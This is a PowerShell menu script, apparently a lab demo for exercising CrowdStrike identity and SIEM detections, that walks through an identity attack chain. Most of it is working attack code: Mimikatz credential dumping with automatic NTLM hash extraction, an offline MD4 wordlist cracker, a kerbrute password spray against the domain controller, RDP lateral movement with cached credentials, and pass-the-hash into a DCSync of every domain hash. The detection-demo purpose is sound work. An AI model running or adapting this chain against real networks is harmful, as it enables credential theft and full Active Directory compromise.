# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  CrowdStrike NGSIEM + Identity Protection Demo
#  Version: 5.0 (2026-04-02)
#
#  Attack narrative:
#    1. Phishing campaign (narrative)
#    2. Fortinet CVE exploitation + brute force to unmanaged (narrative)
#    3. Recon + credential dump on UNMANAGED host (active)
#    4. Crack demo hash + kerbrute spray (active)
#    5. Lateral movement: RDP to DT with demo account (active)
#    6. Dump on DT + DCSync on DC (active)
#    7. Lateral movement to Ubuntu - cloud detections (active)
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_DT=<DT IP address>
# set ENV_UBUNTU=<Ubuntu server IP>

$ErrorActionPreference = "Continue"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
$wordlistFile = "$idpDir\wordlist.txt"

# --- Load saved IP overrides (persisted across launches) ---
$ipConfigFile = "$idpDir\ip_config.txt"
if (Test-Path $ipConfigFile) {
    Write-Host "[*] Loading saved config from $ipConfigFile" -ForegroundColor Gray
    Get-Content $ipConfigFile | ForEach-Object {
        if ($_ -match '^(\w+)=(.+)$') {
            Set-Item -Path "env:$($Matches[1])" -Value $Matches[2]
        }
    }
}

# --- Debug: show what env vars are set ---
Write-Host "[*] Env check: DOMAIN=$env:ENV_DOMAIN DC=$env:ENV_DC_IP DT=$env:ENV_DT UBUNTU=$env:ENV_UBUNTU" -ForegroundColor DarkGray

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN)    { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)     { $missing += "ENV_DC_IP" }
if (-not $env:ENV_DT)        { $missing += "ENV_DT" }
if (-not $env:ENV_UBUNTU)    { $missing += "ENV_UBUNTU" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
    Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
    Write-Host '    set ENV_UBUNTU=<Ubuntu IP>' -ForegroundColor Gray
    pause
    exit 1
}
# Default FortiGate IP (simulated)
if (-not $env:ENV_FORTI_IP) { $env:ENV_FORTI_IP = "10.200.99.1" }

# --- Validate IPs ---
$ipPattern = '^\d+\.\d+\.\d+\.\d+$'
$needSave = $false
foreach ($varName in @("ENV_DC_IP", "ENV_DT", "ENV_UBUNTU")) {
    $val = [Environment]::GetEnvironmentVariable($varName)
    if ($val -and $val -notmatch $ipPattern) {
        Write-Host "[!] $varName is set to hostname: $val (need IP address)" -ForegroundColor Red
        $newVal = Read-Host "    Enter IP for $varName"
        if ($newVal -match $ipPattern) {
            Set-Item -Path "env:$varName" -Value $newVal
            Write-Host "    [+] $varName = $newVal" -ForegroundColor Green
            $needSave = $true
        } else {
            Write-Host "    [!] Invalid IP. Exiting." -ForegroundColor Red
            pause; exit 1
        }
    }
}
if ($needSave) {
    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN", "ENV_FORTI_IP=$env:ENV_FORTI_IP") | Out-File -FilePath $ipConfigFile -Encoding ASCII
    Write-Host "[+] IPs saved to $ipConfigFile (won't ask again)" -ForegroundColor Green
}

# Hash files (live extraction, never hardcoded)
$clarkHashFile = "$idpDir\clark_hash.txt"
$demoHashFile = "$idpDir\demo_hash.txt"

function Get-ClarkHash {
    if (Test-Path $clarkHashFile) { return (Get-Content $clarkHashFile -First 1).Trim() }
    Write-Host "[!] No clark.monroe hash found. Run Step 3 or 6 first." -ForegroundColor Red
    return $null
}
function Get-DemoHash {
    if (Test-Path $demoHashFile) { return (Get-Content $demoHashFile -First 1).Trim() }
    Write-Host "[!] No demo hash found. Run Step 3 first." -ForegroundColor Red
    return $null
}

# --- Helper: narrative banner ---
function Show-StepBanner {
    param([string]$Step, [string]$Title, [string[]]$Lines, [string]$Detection = "")
    Clear-Host
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host "  STEP $Step : $Title" -ForegroundColor Cyan
    Write-Host "  ================================================================" -ForegroundColor Cyan
    Write-Host ""
    foreach ($line in $Lines) { Write-Host "  $line" -ForegroundColor White }
    if ($Detection) {
        Write-Host ""
        Write-Host "  Detections: $Detection" -ForegroundColor Yellow
    }
    Write-Host ""
}

$scriptVersion = "5.0"
Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
Start-Sleep -Seconds 2

function Show-Menu {
    Clear-Host
    Write-Host
    Write-Host "================ Identity Attack Demo - Unmanaged Host ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Story: phishing > Fortinet exploit > dump unmanaged > crack > RDP to DT > DCSync > cloud" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Narrative (logs from log generator) ---" -ForegroundColor Yellow
    Write-Host "  1: Phishing Campaign                       [Mimecast spearphishing]"
    Write-Host "  2: Fortinet Exploitation                   [CVE exploit + brute force to unmanaged]"
    Write-Host
    Write-Host "  --- Active (on this unmanaged host) ---" -ForegroundColor Yellow
    Write-Host "  3: Recon + Credential Dump (local)         [whoami, mimikatz SAM + logonpasswords]"
    Write-Host "  4: Crack Demo Hash + Kerbrute Spray        [NTLM offline crack + AD credential spray]"
    Write-Host
    Write-Host "  --- Lateral Movement ---" -ForegroundColor Yellow
    Write-Host "  5: RDP to DT with demo account             [Lateral mvt: shared local admin -> DT]"
    Write-Host "  6: Dump on DT + DCSync on DC               [mimikatz on DT + PtH -> DCSync]"
    Write-Host "  7: Lateral to Ubuntu (Cloud Detections)    [SSH -> Log4Shell + S3 scripts]"
    Write-Host
    Write-Host "  C: Configure IPs" -ForegroundColor DarkGray
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $selection = Read-Host "Select step"
    switch ($selection) {

        # ================================================================
        # STEP 1: PHISHING CAMPAIGN (Narrative)
        # ================================================================
        '1' {
            Show-StepBanner -Step "1" -Title "INITIAL PHISHING CAMPAIGN" -Lines @(
                "The attacker launches spearphishing emails targeting"
                "multiple employees at the organization."
                ""
                "  - .xlsm macro spreadsheet (delivered)"
                "  - .html credential harvester (delivered)"
                "  - .zip archive with payload (blocked by Mimecast)"
                ""
                ">> These logs come from the log generator (Mimecast samples)"
            ) -Detection "Mimecast: email receipt, delivery vs block, suspicious attachments"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - Mimecast events: Rcpt, Process, Delivery" -ForegroundColor White
            Write-Host "  - Blocked vs delivered emails" -ForegroundColor White
            Write-Host "  - Suspicious attachment types (.xlsm, .html)" -ForegroundColor White
            Write-Host
            Write-Host "  [*] Next: Step 2 (Fortinet exploitation)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 2: FORTINET EXPLOITATION (Narrative)
        # ================================================================
        '2' {
            Show-StepBanner -Step "2" -Title "FORTINET EXPLOITATION + ACCESS TO UNMANAGED" -Lines @(
                "The attacker exploits CVEs on the FortiGate at $($env:ENV_FORTI_IP):"
                ""
                "  1. CVE-2024-55591: jsconsole authentication bypass"
                "  2. CVE-2023-27997: SSL-VPN heap overflow"
                "  3. Create short-lived backdoor admin: svc_backup"
                "  4. Establish VPN tunnel into internal network"
                "  5. Brute force/discovery against this unmanaged host"
                "  6. Attacker gains access to unmanaged workstation"
                ""
                ">> FortiGate logs come from the log generator"
                ">> (CVE exploit, admin creation, brute force IPS signatures)"
            ) -Detection "FortiGate: CVE exploit, admin creation/deletion, IPS brute force, VPN tunnel"

            Write-Host "  What to look for in NGSIEM:" -ForegroundColor Cyan
            Write-Host "  - FortiGate admin login anomalies (jsconsole)" -ForegroundColor White
            Write-Host "  - Rapid admin creation then deletion (svc_backup)" -ForegroundColor White
            Write-Host "  - IPS brute force signature against unmanaged host" -ForegroundColor White
            Write-Host "  - VPN tunnel from external IP" -ForegroundColor White
            Write-Host
            Write-Host "  [*] Attacker now has access to this unmanaged host." -ForegroundColor Yellow
            Write-Host "  [*] Next: Step 3 (dump credentials on unmanaged)" -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 3: RECON + CREDENTIAL DUMP ON UNMANAGED (Active)
        # ================================================================
        '3' {
            Show-StepBanner -Step "3" -Title "RECON + CREDENTIAL DUMP ON UNMANAGED" -Lines @(
                "The attacker performs local recon and dumps credentials"
                "on this unmanaged workstation (no CrowdStrike sensor)."
                ""
                "Key finding: the 'demo' local admin account exists here"
                "AND on the managed DT machine (shared local admin password)."
            ) -Detection "None (unmanaged host - no sensor)"

            # --- Recon ---
            Write-Host "--- System Info ---" -ForegroundColor Yellow
            Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
            Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
            Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
            Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
            Write-Host

            Write-Host "--- Local Admins ---" -ForegroundColor Yellow
            net localgroup Administrators
            Write-Host

            Write-Host "--- Local Accounts ---" -ForegroundColor Yellow
            net user
            Write-Host

            # --- Mimikatz dump ---
            Write-Host "--- Mimikatz Credential Dump ---" -ForegroundColor Yellow
            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step3_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

            Write-Host "`n[+] Output saved to: $idpDir\step3_cred_dump.log" -ForegroundColor Green

            # Auto-extract hashes
            $dumpLog = "$idpDir\step3_cred_dump.log"
            if (Test-Path $dumpLog) {
                $logContent = Get-Content $dumpLog -Raw

                # Extract demo hash (SAM)
                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $extractedDemo = $Matches[1].ToLower()
                    $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
                    Write-Host "[+] demo NTLM extracted: $extractedDemo" -ForegroundColor Green
                } else {
                    Write-Host "[!] Could not auto-extract demo hash." -ForegroundColor Yellow
                    $manualDemoHash = Read-Host "  Enter demo NTLM hash manually"
                    if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
                        $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
                        Write-Host "[+] Demo hash saved." -ForegroundColor Green
                    }
                }

                # Extract clark.monroe hash if present (from logonpasswords)
                if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $extractedClark = $Matches[1].ToLower()
                    $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                    Write-Host "[+] clark.monroe NTLM extracted: $extractedClark" -ForegroundColor Green
                }
            }

            Write-Host
            Write-Host "[*] demo hash is the key: same password on DT (shared local admin)." -ForegroundColor Cyan
            Write-Host "[*] Next: Step 4 (crack demo hash) then Step 5 (RDP to DT)." -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 4: CRACK DEMO HASH + KERBRUTE SPRAY (Active)
        # ================================================================
        '4' {
            Show-StepBanner -Step "4" -Title "CRACK DEMO HASH + KERBRUTE SPRAY" -Lines @(
                "Offline dictionary attack against the demo NTLM hash,"
                "then spray the cracked password against all AD users."
            ) -Detection "CrowdStrike IDP: CredentialScanningActiveDirectory"

            # --- 4a: Crack ---
            Write-Host "--- 4a: NTLM Hash Cracking ---" -ForegroundColor Yellow
            Write-Host

            $demoHash = Get-DemoHash
            if (-not $demoHash -or $demoHash.Length -ne 32) {
                Write-Host "  [!] No valid demo hash. Run Step 3 first." -ForegroundColor Red
                break
            }
            Write-Host "  [*] Target hash: $demoHash" -ForegroundColor White

            if (Test-Path $wordlistFile) {
                $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
                Write-Host "  [*] Loaded $($wordlist.Count) passwords from $wordlistFile" -ForegroundColor Gray
            } else {
                Write-Host "  [!] No wordlist.txt found at $wordlistFile" -ForegroundColor Red
                break
            }

            # MD4 via Windows CryptoAPI
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CryptoMD4 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptDestroyHash(IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
    public static string ComputeMD4(byte[] data) {
        IntPtr hProv = IntPtr.Zero; IntPtr hHash = IntPtr.Zero;
        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
        CryptHashData(hHash, data, (uint)data.Length, 0);
        byte[] hash = new byte[16]; uint len = 16;
        CryptGetHashParam(hHash, 2, hash, ref len, 0);
        CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0);
        return BitConverter.ToString(hash).Replace("-","").ToLower();
    }
}
"@ -ErrorAction SilentlyContinue

            $crackedPw = $null
            $attempts = 0
            $startTime = Get-Date
            foreach ($pw in $wordlist) {
                $attempts++
                try {
                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($pw)
                    $computed = [CryptoMD4]::ComputeMD4($bytes)
                    if ($computed -eq $demoHash) {
                        $elapsed = ((Get-Date) - $startTime).TotalSeconds
                        Write-Host "  [+] CRACKED! Password: $pw" -ForegroundColor Green
                        Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
                        $crackedPw = $pw
                        $crackedPw | Out-File -FilePath "$idpDir\demo_password.txt" -Encoding ASCII
                        Write-Host "  [+] Password saved to $idpDir\demo_password.txt" -ForegroundColor Green
                        break
                    }
                } catch { }
                if ($attempts % 10 -eq 0) { Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray }
            }
            if (-not $crackedPw) {
                Write-Host "  [-] Exhausted wordlist ($attempts passwords)." -ForegroundColor Yellow
            }

            # --- 4b: Kerbrute spray ---
            Write-Host
            Write-Host "--- 4b: Kerbrute Password Spray ---" -ForegroundColor Yellow
            Write-Host

            $userFile = "$idpDir\ldap_users.txt"
            if (-not (Test-Path $userFile)) { $userFile = "$idpDir\users.txt" }
            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray

            if ($crackedPw) {
                Write-Host "  [+] Using cracked password: $crackedPw" -ForegroundColor Green
                $sprayPw = $crackedPw
            } else {
                $sprayPw = Read-Host "  Enter password to spray (or Enter to skip)"
            }

            if ($sprayPw) {
                Write-Host "  [*] Spraying against all users..." -ForegroundColor White
                Write-Host "  [*] Triggers CredentialScanningActiveDirectory" -ForegroundColor Yellow
                Write-Host

                $kerbrute = "$idpDir\kerbrute.exe"
                if (-not (Test-Path $kerbrute)) { $kerbrute = "$idpDir\kerbrute_windows_amd64.exe" }
                if (Test-Path $kerbrute) {
                    try {
                        $proc = Start-Process -FilePath $kerbrute `
                            -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
                            -NoNewWindow -Wait -PassThru
                        Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
                    } catch { Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red }
                } else {
                    Write-Host "  [!] kerbrute not found at $idpDir" -ForegroundColor Red
                }
            }

            Write-Host
            Write-Host "[*] Next: Step 5 (RDP to DT with demo account)." -ForegroundColor Cyan
        }

        # ================================================================
        # STEP 5: RDP TO DT WITH DEMO ACCOUNT (Active)
        # ================================================================
        '5' {
            Show-StepBanner -Step "5" -Title "LATERAL MOVEMENT: RDP TO DT (demo account)" -Lines @(
                "The demo account is a shared local admin on both this"
                "unmanaged host and the DT machine at $($env:ENV_DT)."
                ""
                "The attacker uses the cracked password to RDP to DT."
                "DT has CrowdStrike Falcon in DETECT mode."
            ) -Detection "CrowdStrike: lateral movement, RDP from unmanaged source"

            # Load cracked password
            $demoPw = $null
            if (Test-Path "$idpDir\demo_password.txt") {
                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
                Write-Host "  [+] Using cracked password: $demoPw" -ForegroundColor Green
            } else {
                $demoPw = Read-Host "  Enter demo account password"
            }

            if (-not $demoPw) {
                Write-Host "  [!] No password. Run Step 4 first." -ForegroundColor Red
                break
            }

            Write-Host "  User:   demo (local admin on both hosts)" -ForegroundColor White
            Write-Host "  Pass:   $demoPw" -ForegroundColor White
            Write-Host "  Target: $env:ENV_DT (DT - Falcon managed)" -ForegroundColor White
            Write-Host

            # Cache credentials and launch RDP
            Write-Host "  [*] Caching credentials for RDP..." -ForegroundColor White
            cmdkey /generic:TERMSRV/$env:ENV_DT /user:$env:ENV_DT\demo /pass:$demoPw

            Write-Host "  [*] Launching RDP to $env:ENV_DT..." -ForegroundColor White
            Start-Process "mstsc" -ArgumentList "/v:$env:ENV_DT"

            Write-Host
            Write-Host "  [+] RDP launched. Log in as demo on DT." -ForegroundColor Green
            Write-Host "  [*] Once on DT, run Step 6 to dump credentials there." -ForegroundColor Cyan
            Write-Host
            Write-Host "  [*] To clean up cached creds later:" -ForegroundColor Gray
            Write-Host "      cmdkey /delete:TERMSRV/$env:ENV_DT" -ForegroundColor Gray
        }

        # ================================================================
        # STEP 6: DUMP ON DT + DCSYNC ON DC (Active)
        # ================================================================
        '6' {
            Show-StepBanner -Step "6" -Title "DUMP ON DT + DCSYNC ON DC" -Lines @(
                "Now on DT (via RDP), the attacker dumps credentials."
                "DT has CrowdStrike Falcon - this triggers detections."
                ""
                "Then uses any Domain Admin hash found to DCSync the DC,"
                "extracting ALL domain password hashes."
            ) -Detection "CrowdStrike: LSASS access, credential dump, PassTheHash, DCSync"

            Write-Host "  NOTE: Run mimikatz on DT (in the RDP session):" -ForegroundColor Yellow
            Write-Host
            Write-Host "  On DT, open an admin cmd and run:" -ForegroundColor Cyan
            Write-Host '    C:\IDP_Files\Mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "log C:\IDP_Files\dt_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"' -ForegroundColor Green
            Write-Host
            Write-Host "  Look for Domain Admin hashes (e.g., clark.monroe)." -ForegroundColor White
            Write-Host
            Write-Host "  -----------------------------------------------" -ForegroundColor DarkGray
            Write-Host

            # Offer DCSync if we have a DA hash
            $clarkHash = Get-ClarkHash
            if ($clarkHash) {
                Write-Host "  [+] clark.monroe hash available: $clarkHash" -ForegroundColor Green
                $doDCSync = Read-Host "  Launch DCSync with clark.monroe? (y/N)"
                if ($doDCSync -eq 'y') {
                    $dcSyncBat = @(
                        "@echo off"
                        "echo [*] DCSync against $env:ENV_DC_IP ($env:ENV_DOMAIN)..."
                        "echo."
                        "`"$mimiExe`" `"privilege::debug`" `"log $idpDir\dcsync_output.log`" `"lsadump::dcsync /domain:$env:ENV_DOMAIN /all /csv`" `"exit`""
                        "echo."
                        "echo [+] DCSync complete. Output: $idpDir\dcsync_output.log"
                        "pause"
                    )
                    $dcSyncBat -join "`r`n" | Out-File -FilePath "$idpDir\Post_PtH_DCSync.bat" -Encoding ASCII

                    Write-Host "  [*] Launching PtH clark.monroe -> DCSync..." -ForegroundColor White
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\Post_PtH_DCSync.bat`""
                    Write-Host "  [+] DCSync launched in new window." -ForegroundColor Green
                }
            } else {
                Write-Host "  [*] No DA hash yet. Run mimikatz on DT first (see above)." -ForegroundColor Yellow
                Write-Host "  [*] Then enter the clark.monroe hash:" -ForegroundColor Yellow
                $manualClark = Read-Host "  clark.monroe NTLM (32 hex, or Enter to skip)"
                if ($manualClark -and $manualClark.Length -eq 32) {
                    $manualClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                    Write-Host "  [+] Saved. Re-run Step 6 to launch DCSync." -ForegroundColor Green
                }
            }
        }

        # ================================================================
        # STEP 7: LATERAL MOVEMENT TO UBUNTU (Active)
        # ================================================================
        '7' {
            Show-StepBanner -Step "7" -Title "LATERAL MOVEMENT TO UBUNTU - CLOUD DETECTIONS" -Lines @(
                "The attacker moves from the Windows domain to the"
                "Ubuntu server at $($env:ENV_UBUNTU)."
                ""
                "Pre-staged scripts trigger cloud security detections:"
                ""
                "  1. Log4Shell behavioral detection (JNDI injection)"
                "     /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh"
                ""
                "  2. S3 bucket logging disabled"
                "     /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh"
                ""
                "  S3 bucket: warp-duck-private-bucket-d14afc48"
            ) -Detection "CrowdStrike: Log4Shell IoA, S3 bucket logging change"

            Write-Host "  --- SSH Connection ---" -ForegroundColor Yellow
            Write-Host
            Write-Host "  Run:" -ForegroundColor Cyan
            Write-Host "    ssh ubuntu@$env:ENV_UBUNTU" -ForegroundColor Green
            Write-Host
            Write-Host "  Then execute:" -ForegroundColor Cyan
            Write-Host "    /home/ubuntu/detections/cloud/ioa/behavioral-ioa.sh" -ForegroundColor Green
            Write-Host "    /home/ubuntu/detections/cloud/ioa/disable-bucket-logging-ioa.sh" -ForegroundColor Green
            Write-Host

            $launchSSH = Read-Host "  Launch SSH now? (y/N)"
            if ($launchSSH -eq 'y') {
                $sshUser = Read-Host "  SSH username (default: ubuntu)"
                if (-not $sshUser) { $sshUser = "ubuntu" }
                try {
                    Start-Process -FilePath "ssh" -ArgumentList "$sshUser@$env:ENV_UBUNTU"
                    Write-Host "  [+] SSH launched." -ForegroundColor Green
                } catch {
                    Write-Host "  [!] SSH not available. Connect manually." -ForegroundColor Red
                }
            }
        }

        # ================================================================
        # C: CONFIGURE IPs
        # ================================================================
        {$_ -eq 'C' -or $_ -eq 'c'} {
            Clear-Host
            Write-Host "`n--- Current Configuration ---" -ForegroundColor Cyan
            Write-Host "  ENV_DOMAIN   = $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  ENV_DC_IP    = $env:ENV_DC_IP" -ForegroundColor White
            Write-Host "  ENV_DT       = $env:ENV_DT" -ForegroundColor White
            Write-Host "  ENV_FORTI_IP = $env:ENV_FORTI_IP" -ForegroundColor White
            Write-Host "  ENV_UBUNTU   = $env:ENV_UBUNTU" -ForegroundColor White
            Write-Host

            $editVar = Read-Host "  Variable to change (or Enter to go back)"
            if ($editVar -and $editVar -match '^ENV_') {
                $newVal = Read-Host "  New value for $editVar"
                if ($newVal) {
                    Set-Item -Path "env:$editVar" -Value $newVal
                    Write-Host "  [+] $editVar = $newVal" -ForegroundColor Green
                    @("ENV_DC_IP=$env:ENV_DC_IP", "ENV_DT=$env:ENV_DT", "ENV_UBUNTU=$env:ENV_UBUNTU", "ENV_DOMAIN=$env:ENV_DOMAIN", "ENV_FORTI_IP=$env:ENV_FORTI_IP") | Out-File -FilePath $ipConfigFile -Encoding ASCII
                    Write-Host "  [+] Saved." -ForegroundColor Green
                }
            }
        }

        'q' { return }
    }
    pause
}
until ($selection -eq 'q')
